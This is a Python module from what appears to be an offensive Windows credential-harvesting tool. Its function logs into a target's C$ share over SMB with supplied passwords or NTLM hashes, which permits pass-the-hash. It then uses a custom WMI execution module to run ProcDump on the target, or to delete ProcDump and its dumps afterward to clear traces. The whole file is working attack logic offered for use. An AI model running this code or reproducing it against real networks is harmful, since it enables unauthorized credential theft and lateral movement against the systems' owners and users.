# coding: utf-8
# Author:	@aas_s3curity

# Imports
import sys, logging, traceback
from submodules.customWmiExec import wmiexec
from submodules.customWmiExec import wmiexec_delete
from core.Colors import infoYellow, green, white, green, red, blue, warningRed
from core.Arch import get_os_arch
from core.Connection import Connection


def sprayLove(user, target, local_ip, remove):
    try:
        smbConnection = Connection(user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, None, 'C$', False, False, None).run(target)
        if remove:
            exec_method = wmiexec_delete.WMIEXEC_DELETE(smbConnection, user.username, user.password, user.domain, user.lmhash, user.nthash)
            logging.warning("%sDeleting ProcDump and Dumps on %s%s%s..." % (infoYellow, green, target, white))
        else:
            exec_method = wmiexec.WMIEXEC(smbConnection, user.username, user.password, user.domain, user.lmhash, user.nthash)
            logging.warning("%sProcDumping %s%s%s. Be patient..." % (infoYellow, green, target, white))
        exec_method.run(target, get_os_arch(target))
    except UnboundLocalError:
        logging.info("%s%s: The dump cannot be opened. Check if ProcDump worked with -v debug." % (warningRed, target))
    except Exception as e:
        logging.info("%sA problem occurs with %s%s%s. Err: %s" % (warningRed, red, target, white, e))
        logging.debug("%s==== STACKTRACE ====" % (blue))
        if logging.getLogger().getEffectiveLevel() <= 10: traceback.print_exc(file=sys.stdout)
        logging.debug("%s==== STACKTRACE ====%s" % (blue, white))
